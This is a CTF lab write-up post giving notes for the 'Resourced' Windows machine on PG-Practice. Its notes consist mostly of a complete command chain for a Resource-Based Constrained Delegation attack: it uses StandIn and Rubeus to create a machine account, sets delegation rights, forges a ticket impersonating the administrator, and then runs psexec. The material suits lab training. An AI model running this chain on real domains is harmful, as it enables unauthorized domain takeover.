---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/xMTCZt5DRB0/0.jpg
layout: post
media_subpath: /assets/posts/2022-08-27-resource-based-constrained-delegation-resourced-pg-practice
tags:
- active directory
- pg practice
- rbcd
- windows
title: Resource-Based Constrained Delegation - Resourced @ PG-Practice
---

Additional notes for Resourced, an intermediate difficulty Windows machine on [PG-Practice](https://portal.offensive-security.com/labs/practice) that involves password spraying and an RBCD attack.

{% youtube xMTCZt5DRB0 %} 

## Notes

**RBCD via WinRM & StandIn**

```
# Upload
upload /home/xct/drop/StandIn_v13_Net45.exe StandIn.exe
upload /home/xct/drop/Rubeus.exe Rubeus.exe

# Create machine account
.\StandIn.exe --computer xct --make
Get-ADComputer -Filter * | Select-Object Name, SID

# Write msDS-AllowedToActOnBehalfOfOtherIdentity
.\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101

# Get Hash (on Kali)
import hashlib,binascii
hash = hashlib.new('md4', "<new machine password from last step>".encode('utf-16le')).digest()
print(binascii.hexlify(hash))

# Impersonate Administrator
.\Rubeus.exe s4u /user:xct /rc4:44714c0e1624e71ac5540fd3aa9c6681 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt

# Convert Ticket & PSExec with Kerberos (on Kali)
cat ticket.b64 | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=`pwd`/ticket.ccache
klist
impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.114.175
```

## Resources

- <https://github.com/FuzzySecurity/StandIn>
- <https://github.com/tothi/rbcd-attack>